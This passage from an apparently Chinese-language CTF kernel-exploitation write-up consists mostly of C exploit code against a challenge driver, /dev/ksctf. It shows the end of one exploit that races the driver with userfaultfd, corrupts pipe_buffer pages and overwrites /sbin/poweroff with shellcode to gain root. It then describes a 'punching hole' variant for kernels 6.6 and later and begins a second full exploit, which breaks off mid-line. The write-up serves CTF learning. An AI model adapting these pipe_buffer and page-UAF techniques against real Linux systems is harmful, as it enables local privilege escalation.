class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack,<span class="number">0x2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try to find corrupted pipe_buf</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] finding corrupted page\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> corrupted_index = <span class="number">-1</span>, pointed_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        already_read[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">uint32_t</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> p_buf[<span class="number">0x10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">memset</span>(p_buf, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], p_buf, <span class="number">8</span>);</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k != i) &#123;</span><br><span class="line">            corrupted_index = i;</span><br><span class="line">            pointed_index = k;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found %d=&gt;%d pipe data: %p\n&quot;</span>, i, k, *(<span class="type">uint64_t</span> *)p_buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (corrupted_index == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to find corrupted page\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *alloc_buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(alloc_buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], alloc_buf, <span class="number">0x20</span>);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">1</span>]);</span><br><span class="line">    <span class="type">int</span> passwd_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        passwd_fd[i] = open(<span class="string">&quot;/sbin/poweroff&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(passwd_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;open file.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> tmp = <span class="number">0x480e801f</span>;</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], &amp;tmp, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> retval = write(passwd_fd[i], shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        <span class="keyword">if</span>(retval &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;write file success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        close(passwd_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ±‚è§£æ•ˆæœ-2"><a href="#æ±‚è§£æ•ˆæœ-2" class="headerlink" title="æ±‚è§£æ•ˆæœ"></a>æ±‚è§£æ•ˆæœ</h3><img src="/2024/10/07/kno_puts/12.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="punching-hole-pipe-buffer-page-UAF"><a href="#punching-hole-pipe-buffer-page-UAF" class="headerlink" title="punching hole + pipe_buffer  + page UAF"></a>punching hole + pipe_buffer  + page UAF</h2><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>è¿™é‡Œæˆ‘ä»¬å¯¹é¢˜ç›®å†è¿›è¡Œæœ€åä¸€æ¬¡å‡çº§ï¼Œæˆ‘ä»¬å‡è®¾ <code>kernel</code> ç‰ˆæœ¬ä¸º <code>6.6+</code>ï¼Œè¿™ä¸ªæ—¶å€™ <code>userfaultfd</code> å°±åªè¿è¡Œç‰¹æƒç”¨æˆ·ä½¿ç”¨äº†ã€‚ä¹Ÿè®¸æˆ‘ä»¬ä¼šæƒ³åˆ°ç”¨ <code>fuse</code>ï¼Œå¯æ˜¯åœ¨ <code>kernel pwn</code> è¿™ç§ç¯å¢ƒæ®‹ç¼ºçš„æƒ…å†µå¾ˆéš¾ä½¿ç”¨ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ <code>punching hole</code>ã€‚è¿™ä¸ªæ‰“æ³•ç¬”è€…æ˜¯ç¬¬ä¸€æ¬¡å¬ï¼Œç½‘ä¸Šä¹Ÿæ‰¾ä¸åˆ°ä»€ä¹ˆèµ„æ–™ï¼Œæœ€åä¹Ÿæ˜¯è¯·æ•™ Csome å¸ˆå…„å’Œ cnitlrt å¸ˆå‚…ã€‚å¤§è‡´æ„æ€å°±æ˜¯æŠŠçº¿ç¨‹ä¸¢åˆ°ä¸€ä¸ªç­‰å¾…é˜Ÿåˆ—ï¼Œä»¤ä¸€ä¸ªçº¿ç¨‹ä¼‘çœ ï¼Œå…¶è§¦å‘æ¡ä»¶å’Œ <code>userfaultfd</code> ä¸€æ ·ä¹Ÿæ˜¯é€šè¿‡ <code>copy</code> ç±»å‡½æ•°è§¦å‘ã€‚å°† <code>userfaultfd</code> æ”¹ç”¨ <code>punching hole</code> åå…¶ä½™æ“ä½œå’Œä¸Šé¢é‚£ä¸ª <code>exp</code> ä¸€è‡´ï¼Œä¸è¿‡ç”±äºä½¿ç”¨äº† <code>punching hole</code> åå †çš„å¸ƒå±€æœ‰äº†ç‚¹å˜åŒ–ï¼Œæ‰€ä»¥æˆ‘ <code>pipe_buffer</code> åœ¨å †å— <code>uaf</code> çš„å‰é¢å’Œåé¢å„å–·äº†ä¸€æ¬¡ä»¥æ¥æé«˜å‘½ä¸­ç‡ã€‚</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PIPE_COUNT 0x50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SECONDARY_PIPE_COUNT 0x150</span></span><br><span class="line"><span class="type">int</span> pipe_fd[MAX_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> already_read[MAX_PIPE_COUNT];</span><br><span class="line"><span class="type">int</span> snd_pipe_fd[MAX_SECONDARY_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> cnt)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s start from index: %d\n&quot;</span>, __PRETTY_FUNCTION__, start);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; cnt; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s\n&quot;</span>, __PRETTY_FUNCTION__);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_SECONDARY_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(snd_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(snd_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;resize pipe&quot;</span>);    </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span 